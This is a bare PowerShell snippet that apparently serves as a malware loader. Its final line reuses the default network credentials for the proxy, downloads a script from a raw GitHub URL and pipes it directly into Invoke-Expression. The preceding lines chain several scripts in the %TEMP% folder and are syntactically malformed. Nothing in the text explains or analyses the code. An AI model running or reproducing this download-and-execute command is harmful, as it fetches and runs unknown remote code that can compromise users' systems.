$x2 = %TEMP%\a1.ps1;
$x1 = %TEMP%\a2.ps1 $x2;
& %TEMP%\a3.ps1 $x1;

(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/git-dispose01/deposit/main/a') -UseBasicParsing |iex
